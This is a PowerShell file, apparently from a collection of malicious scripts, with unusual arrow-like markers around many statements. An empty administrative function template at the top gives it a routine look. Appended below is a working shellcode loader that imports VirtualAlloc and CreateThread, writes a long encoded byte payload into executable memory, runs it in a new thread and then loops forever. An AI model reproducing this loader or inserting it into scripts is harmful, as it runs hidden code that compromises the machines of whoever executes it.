
 -||-> Function Verb-Noun {

	[CmdletBinding()]
	Param (
	)
	
	Begin {
		
		 -||-> [string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name <-||- 
		 -||-> Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header <-||- 
	}
	Process {
		 -||-> Try {
			
		}
		Catch {
			 -||-> Write-Log -Message "<error message>. `n$( -||-> Resolve-Error <-||- )" -Severity 3 -Source ${CmdletName} <-||- 
		} <-||- 
	}
	End {
		 -||-> Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer <-||- 
	}
} <-||- 
 -||-> $w3Oa = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $w3Oa -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbd,0x41,0xc1,0x85,0xf0,0xdb,0xd4,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x5b,0x31,0x6a,0x14,0x03,0x6a,0x14,0x83,0xc2,0x04,0xa3,0x34,0x79,0x18,0xa1,0xb7,0x82,0xd9,0xc5,0x3e,0x67,0xe8,0xc5,0x25,0xe3,0x5b,0xf5,0x2e,0xa1,0x57,0x7e,0x62,0x52,0xe3,0xf2,0xab,0x55,0x44,0xb8,0x8d,0x58,0x55,0x90,0xee,0xfb,0xd5,0xea,0x22,0xdc,0xe4,0x25,0x37,0x1d,0x20,0x5b,0xba,0x4f,0xf9,0x10,0x69,0x60,0x8e,0x6c,0xb2,0x0b,0xdc,0x61,0xb2,0xe8,0x95,0x80,0x93,0xbe,0xae,0xdb,0x33,0x40,0x62,0x50,0x7a,0x5a,0x67,0x5c,0x34,0xd1,0x53,0x2b,0xc7,0x33,0xaa,0xd4,0x64,0x7a,0x02,0x27,0x74,0xba,0xa5,0xd7,0x03,0xb2,0xd5,0x6a,0x14,0x01,0xa7,0xb0,0x91,0x92,0x0f,0x33,0x01,0x7f,0xb1,0x90,0xd4,0xf4,0xbd,0x5d,0x92,0x53,0xa2,0x60,0x77,0xe8,0xde,0xe9,0x76,0x3f,0x57,0xa9,0x5c,0x9b,0x33,0x6a,0xfc,0xba,0x99,0xdd,0x01,0xdc,0x41,0x82,0xa7,0x96,0x6c,0xd7,0xd5,0xf4,0xf8,0x49,0x83,0x72,0xf9,0xfd,0x3c,0x12,0x97,0x94,0x96,0x8c,0x2b,0x11,0x31,0x4a,0x4b,0x08,0x0c,0x8f,0xe0,0xe1,0x3c,0x7c,0x54,0x6d,0xf9,0xd4,0x23,0xca,0x02,0x0d,0x80,0x47,0x97,0xad,0x74,0x34,0x0d,0xe2,0x92,0xc2,0xd1,0x02,0x63,0x1d,0x8d,0x46,0x50,0x2c,0x08,0x47,0xc6,0xc6,0x3d,0xce,0x79,0xd0,0x3d,0x05,0x0c,0x1a,0x92,0xce,0x0f,0xa0,0x75,0x8b,0x43,0xf7,0x26,0xc4,0x30,0xa1,0xa0,0x01,0xe3,0x63,0x0a,0x29,0xd9,0xed,0x06,0xdf,0xbd,0x42,0x84,0x8c,0x12,0x32,0x42,0x1e,0x93,0xa2,0xe9,0x9f,0x4e,0x57,0xcd,0x15,0x7b,0x18,0xbb,0x38,0x13,0x56,0xf6,0x61,0xb2,0x69,0x2c,0x0f,0x7b,0xfd,0xcf,0xc0,0x7b,0xfd,0xa7,0xe0,0x7b,0xbd,0x37,0xb2,0x13,0x65,0x9c,0x67,0x01,0x6a,0x09,0x14,0x9a,0xc7,0x3b,0xfc,0x4a,0x8f,0x3b,0x23,0x75,0x4f,0x6f,0x75,0x1d,0x5d,0x19,0xf0,0x3f,0x9e,0xf0,0x86,0x00,0x14,0x36,0x03,0x87,0xd5,0x0b,0x91,0x48,0xa0,0x6e,0xc2,0x8b,0x15,0x99,0x7a,0xf4,0x56,0xa6,0x18,0x68,0x9a,0x74,0xd6,0x5c,0xf7,0xb1,0x2f,0x8c,0x35,0x8c,0x7c,0xe3,0x0e,0xc6,0xac,0x9a,0x00,0x0b,0xc2,0x33,0x95,0x27,0x4c,0xa9,0x34,0xbb,0xf8,0x1c,0x87,0x15,0x62,0x30,0x8a,0x19,0x11,0xba,0x31,0xf4,0xb8,0x2f,0xd8,0x72,0x54,0xde,0x7b,0xf4,0xd9,0x30,0x18,0x95,0x70,0x4d <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $eJn4=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $eJn4.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$eJn4,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



